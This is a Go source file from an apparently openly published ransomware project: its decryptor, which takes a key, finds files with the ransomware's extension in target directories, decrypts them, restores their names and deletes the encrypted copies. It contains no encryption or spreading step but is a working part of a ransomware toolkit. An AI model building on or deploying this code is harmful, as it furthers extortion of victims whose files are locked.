package main

import (
	"encoding/base64"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"
	"sync"

	"github.com/mauri870/ransomware/cmd"
	"github.com/mauri870/ransomware/cryptofs"
)

func init() {
	// Fun ASCII
	cmd.PrintBanner()

	// Execution locked for windows
	cmd.CheckOS()
}

func main() {
	// Ask for the encryption key
	var key string
	for {
		fmt.Println("Type your encryption key and press enter to proceed")
		fmt.Scanf("%s\n", &key)
		if len(key) != 32 {
			fmt.Println("Your encryption key must have 32 characters")
			continue
		}

		break
	}

	// Decrypt files
	decryptFiles(key)

	// Wait for enter to exit
	fmt.Println("Press enter to quit")
	var s string
	fmt.Scanf("%s", &s)
}

func decryptFiles(key string) {
	// The encription key is randomly and generated on runtime, so we cannot known
	// if an encryption key is correct
	fmt.Println("Note: \nIf you are trying a wrong key your files will be decrypted with broken content irretrievably, please don't try keys randomly\nYou have been warned")
	fmt.Println("Continue? Y/N")

	var input rune
	fmt.Scanf("%c\n", &input)

	if input != 'Y' {
		os.Exit(2)
	}

	log.Println("Walking dirs and searching for encrypted files...")

	// Setup a waitgroup so we can wait for all goroutines to finish
	var wg sync.WaitGroup

	wg.Add(1)

	// Indexing files in a concurrently thread
	go func() {
		// Decrease the wg count after finish this goroutine
		defer wg.Done()

		// Loop over the interesting directories
		for _, f := range cmd.InterestingDirs {
			folder := cmd.BaseDir + f
			filepath.Walk(folder, func(path string, f os.FileInfo, err error) error {
				ext := filepath.Ext(path)
				// Matching Files encrypted
				if ext == cmd.EncryptionExtension {

					// Each file is processed by a free worker on the pool.
					// Send the file to the MatchedFiles channel then workers
					// can imediatelly proccess then
					log.Println("Matched:", path)
					cmd.MatchedFiles <- &cryptofs.File{FileInfo: f, Extension: ext[1:], Path: path}

					// For each file we need wait for the respective goroutine to finish
					wg.Add(1)
				}
				return nil
			})
		}

		// Close the MatchedFiles channel after all files have been indexed and send to then
		close(cmd.MatchedFiles)
	}()

	// Process files that are sended to the channel
	// Launch NumWorker workers for handle the files concurrently
	for i := 0; i < cmd.NumWorkers; i++ {
		go func() {
			for {
				select {
				case file, ok := <-cmd.MatchedFiles:
					// Check if has nothing to receive from the channel
					if !ok {
						return
					}
					defer wg.Done()

					log.Printf("Decrypting %s...\n", file.Path)

					encodedFileName := file.Name()[:len(file.Name())-len("."+file.Extension)]
					filepathWithoutExt := file.Path[:len(file.Path)-len(filepath.Ext(file.Path))]
					decodedFileName, err := base64.StdEncoding.DecodeString(encodedFileName)
					if err != nil {
						log.Println(err)
						continue
					}
					// Get the correct output file name
					newpath := strings.Replace(filepathWithoutExt, encodedFileName, string(decodedFileName), -1)
					// Create/Open the output file
					outFile, err := os.OpenFile(newpath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
					if err != nil {
						log.Println(err)
						continue
					}
					defer outFile.Close()

					// Decrypt a single file received from the channel
					err = file.Decrypt(key, outFile)
					if err != nil {
						log.Println(err)
						continue
					}

					// Remove the encrypted file
					err = os.Remove(file.Path)
					if err != nil {
						log.Println(err)
						continue
					}
				}
			}
		}()
	}

	// Wait for all goroutines to finish
	wg.Wait()
}
